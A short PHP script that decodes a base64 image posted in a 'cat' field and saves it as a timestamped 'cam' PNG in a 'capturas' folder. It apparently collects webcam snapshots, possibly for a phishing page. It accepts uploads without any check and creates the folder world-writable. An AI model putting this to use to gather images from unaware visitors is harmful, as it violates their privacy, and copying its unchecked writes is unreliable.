<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];
$nombre_directorio = 'capturas';

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");

}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);

if (!file_exists($nombre_directorio)) {
    mkdir($nombre_directorio, 0777, true);
}

$fp = fopen($nombre_directorio.'/cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

exit();
?>

